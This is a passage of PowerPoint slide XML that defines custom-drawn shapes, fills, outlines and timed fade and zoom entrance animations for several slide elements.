                      <a:pt x="0" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="134"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="76" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="150" y="176"/>
                <a:ext cx="80" cy="72"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 120"/>
                  <a:gd name="T1" fmla="*/ 1 h 108"/>
                  <a:gd name="T2" fmla="*/ 1 w 120"/>
                  <a:gd name="T3" fmla="*/ 1 h 108"/>
                  <a:gd name="T4" fmla="*/ 1 w 120"/>
                  <a:gd name="T5" fmla="*/ 1 h 108"/>
                  <a:gd name="T6" fmla="*/ 1 w 120"/>
                  <a:gd name="T7" fmla="*/ 1 h 108"/>
                  <a:gd name="T8" fmla="*/ 1 w 120"/>
                  <a:gd name="T9" fmla="*/ 0 h 108"/>
                  <a:gd name="T10" fmla="*/ 1 w 120"/>
                  <a:gd name="T11" fmla="*/ 0 h 108"/>
                  <a:gd name="T12" fmla="*/ 1 w 120"/>
                  <a:gd name="T13" fmla="*/ 1 h 108"/>
                  <a:gd name="T14" fmla="*/ 1 w 120"/>
                  <a:gd name="T15" fmla="*/ 1 h 108"/>
                  <a:gd name="T16" fmla="*/ 1 w 120"/>
                  <a:gd name="T17" fmla="*/ 1 h 108"/>
                  <a:gd name="T18" fmla="*/ 1 w 120"/>
                  <a:gd name="T19" fmla="*/ 1 h 108"/>
                  <a:gd name="T20" fmla="*/ 1 w 120"/>
                  <a:gd name="T21" fmla="*/ 1 h 108"/>
                  <a:gd name="T22" fmla="*/ 1 w 120"/>
                  <a:gd name="T23" fmla="*/ 1 h 108"/>
                  <a:gd name="T24" fmla="*/ 1 w 120"/>
                  <a:gd name="T25" fmla="*/ 1 h 108"/>
                  <a:gd name="T26" fmla="*/ 1 w 120"/>
                  <a:gd name="T27" fmla="*/ 1 h 108"/>
                  <a:gd name="T28" fmla="*/ 1 w 120"/>
                  <a:gd name="T29" fmla="*/ 1 h 108"/>
                  <a:gd name="T30" fmla="*/ 1 w 120"/>
                  <a:gd name="T31" fmla="*/ 1 h 108"/>
                  <a:gd name="T32" fmla="*/ 1 w 120"/>
                  <a:gd name="T33" fmla="*/ 1 h 108"/>
                  <a:gd name="T34" fmla="*/ 1 w 120"/>
                  <a:gd name="T35" fmla="*/ 1 h 108"/>
                  <a:gd name="T36" fmla="*/ 0 w 120"/>
                  <a:gd name="T37" fmla="*/ 1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0"/>
                  <a:gd name="T58" fmla="*/ 0 h 108"/>
                  <a:gd name="T59" fmla="*/ 120 w 120"/>
                  <a:gd name="T60" fmla="*/ 108 h 10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0" h="108">
                    <a:moveTo>
                      <a:pt x="0" y="53"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="3" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="102"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="102"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0"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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="181" y="179"/>
                <a:ext cx="19" cy="17"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 28"/>
                  <a:gd name="T1" fmla="*/ 1 h 26"/>
                  <a:gd name="T2" fmla="*/ 1 w 28"/>
                  <a:gd name="T3" fmla="*/ 1 h 26"/>
                  <a:gd name="T4" fmla="*/ 1 w 28"/>
                  <a:gd name="T5" fmla="*/ 0 h 26"/>
                  <a:gd name="T6" fmla="*/ 1 w 28"/>
                  <a:gd name="T7" fmla="*/ 0 h 26"/>
                  <a:gd name="T8" fmla="*/ 1 w 28"/>
                  <a:gd name="T9" fmla="*/ 1 h 26"/>
                  <a:gd name="T10" fmla="*/ 1 w 28"/>
                  <a:gd name="T11" fmla="*/ 1 h 26"/>
                  <a:gd name="T12" fmla="*/ 1 w 28"/>
                  <a:gd name="T13" fmla="*/ 1 h 26"/>
                  <a:gd name="T14" fmla="*/ 1 w 28"/>
                  <a:gd name="T15" fmla="*/ 1 h 26"/>
                  <a:gd name="T16" fmla="*/ 1 w 28"/>
                  <a:gd name="T17" fmla="*/ 1 h 26"/>
                  <a:gd name="T18" fmla="*/ 1 w 28"/>
                  <a:gd name="T19" fmla="*/ 1 h 26"/>
                  <a:gd name="T20" fmla="*/ 0 w 28"/>
                  <a:gd name="T21" fmla="*/ 1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
                  <a:gd name="T34" fmla="*/ 0 h 26"/>
                  <a:gd name="T35" fmla="*/ 28 w 28"/>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 h="26">
                    <a:moveTo>
                      <a:pt x="0" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="2" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="2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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="177" y="200"/>
                <a:ext cx="27" cy="40"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 40"/>
                  <a:gd name="T1" fmla="*/ 0 h 60"/>
                  <a:gd name="T2" fmla="*/ 1 w 40"/>
                  <a:gd name="T3" fmla="*/ 1 h 60"/>
                  <a:gd name="T4" fmla="*/ 1 w 40"/>
                  <a:gd name="T5" fmla="*/ 1 h 60"/>
                  <a:gd name="T6" fmla="*/ 1 w 40"/>
                  <a:gd name="T7" fmla="*/ 1 h 60"/>
                  <a:gd name="T8" fmla="*/ 0 w 40"/>
                  <a:gd name="T9" fmla="*/ 1 h 60"/>
                  <a:gd name="T10" fmla="*/ 0 w 40"/>
                  <a:gd name="T11" fmla="*/ 1 h 60"/>
                  <a:gd name="T12" fmla="*/ 1 w 40"/>
                  <a:gd name="T13" fmla="*/ 1 h 60"/>
                  <a:gd name="T14" fmla="*/ 1 w 40"/>
                  <a:gd name="T15" fmla="*/ 1 h 60"/>
                  <a:gd name="T16" fmla="*/ 1 w 40"/>
                  <a:gd name="T17" fmla="*/ 1 h 60"/>
                  <a:gd name="T18" fmla="*/ 1 w 40"/>
                  <a:gd name="T19" fmla="*/ 0 h 60"/>
                  <a:gd name="T20" fmla="*/ 1 w 40"/>
                  <a:gd name="T21" fmla="*/ 0 h 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
                  <a:gd name="T34" fmla="*/ 0 h 60"/>
                  <a:gd name="T35" fmla="*/ 40 w 40"/>
                  <a:gd name="T36" fmla="*/ 60 h 6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 h="60">
                    <a:moveTo>
                      <a:pt x="36" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="36" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="163" y="0"/>
                <a:ext cx="57" cy="53"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 86"/>
                  <a:gd name="T1" fmla="*/ 1 h 80"/>
                  <a:gd name="T2" fmla="*/ 1 w 86"/>
                  <a:gd name="T3" fmla="*/ 1 h 80"/>
                  <a:gd name="T4" fmla="*/ 1 w 86"/>
                  <a:gd name="T5" fmla="*/ 1 h 80"/>
                  <a:gd name="T6" fmla="*/ 1 w 86"/>
                  <a:gd name="T7" fmla="*/ 1 h 80"/>
                  <a:gd name="T8" fmla="*/ 1 w 86"/>
                  <a:gd name="T9" fmla="*/ 0 h 80"/>
                  <a:gd name="T10" fmla="*/ 1 w 86"/>
                  <a:gd name="T11" fmla="*/ 1 h 80"/>
                  <a:gd name="T12" fmla="*/ 1 w 86"/>
                  <a:gd name="T13" fmla="*/ 1 h 80"/>
                  <a:gd name="T14" fmla="*/ 1 w 86"/>
                  <a:gd name="T15" fmla="*/ 1 h 80"/>
                  <a:gd name="T16" fmla="*/ 1 w 86"/>
                  <a:gd name="T17" fmla="*/ 1 h 80"/>
                  <a:gd name="T18" fmla="*/ 1 w 86"/>
                  <a:gd name="T19" fmla="*/ 1 h 80"/>
                  <a:gd name="T20" fmla="*/ 1 w 86"/>
                  <a:gd name="T21" fmla="*/ 1 h 80"/>
                  <a:gd name="T22" fmla="*/ 1 w 86"/>
                  <a:gd name="T23" fmla="*/ 1 h 80"/>
                  <a:gd name="T24" fmla="*/ 1 w 86"/>
                  <a:gd name="T25" fmla="*/ 1 h 80"/>
                  <a:gd name="T26" fmla="*/ 1 w 86"/>
                  <a:gd name="T27" fmla="*/ 1 h 80"/>
                  <a:gd name="T28" fmla="*/ 1 w 86"/>
                  <a:gd name="T29" fmla="*/ 1 h 80"/>
                  <a:gd name="T30" fmla="*/ 1 w 86"/>
                  <a:gd name="T31" fmla="*/ 1 h 80"/>
                  <a:gd name="T32" fmla="*/ 0 w 86"/>
                  <a:gd name="T33" fmla="*/ 1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6"/>
                  <a:gd name="T52" fmla="*/ 0 h 80"/>
                  <a:gd name="T53" fmla="*/ 86 w 86"/>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6" h="80">
                    <a:moveTo>
                      <a:pt x="0" y="40"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="4" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="80"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="40"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:schemeClr val="folHlink"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="80" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="162" y="30"/>
                <a:ext cx="24" cy="12"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 36"/>
                  <a:gd name="T1" fmla="*/ 1 h 19"/>
                  <a:gd name="T2" fmla="*/ 1 w 36"/>
                  <a:gd name="T3" fmla="*/ 1 h 19"/>
                  <a:gd name="T4" fmla="*/ 1 w 36"/>
                  <a:gd name="T5" fmla="*/ 1 h 19"/>
                  <a:gd name="T6" fmla="*/ 1 w 36"/>
                  <a:gd name="T7" fmla="*/ 0 h 19"/>
                  <a:gd name="T8" fmla="*/ 0 w 36"/>
                  <a:gd name="T9" fmla="*/ 1 h 19"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 36"/>
                  <a:gd name="T16" fmla="*/ 0 h 19"/>
                  <a:gd name="T17" fmla="*/ 36 w 36"/>
                  <a:gd name="T18" fmla="*/ 19 h 19"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="36" h="19">
                    <a:moveTo>
                      <a:pt x="0" y="2"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="36" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="2"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="81" name="Rectangle 124"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="184" y="38"/>
                <a:ext cx="12" cy="5"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:blipFill dpi="0" rotWithShape="0">
                <a:blip r:embed="rId2" cstate="print"/>
                <a:srcRect/>
                <a:tile tx="0" ty="0" sx="100000" sy="100000" flip="none" algn="tl"/>
              </a:blipFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="82" name="Rectangle 125"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="158" y="17"/>
                <a:ext cx="5" cy="20"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="55" name="Line 151"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5473129" y="1143410"/>
              <a:ext cx="0" cy="25241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6993492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500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="1500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="15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2500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="17" presetID="47" presetClass="entr" presetSubtype="0" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="154"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="154"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="2000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="154"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="2000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="154"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y-.1"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="22" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="4500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="23" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="155"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="155"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="155"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="155"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="28" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="5500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="29" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="156"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="156"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="156"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="156"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="34" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="6000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="35" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="36" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="157"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="157"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
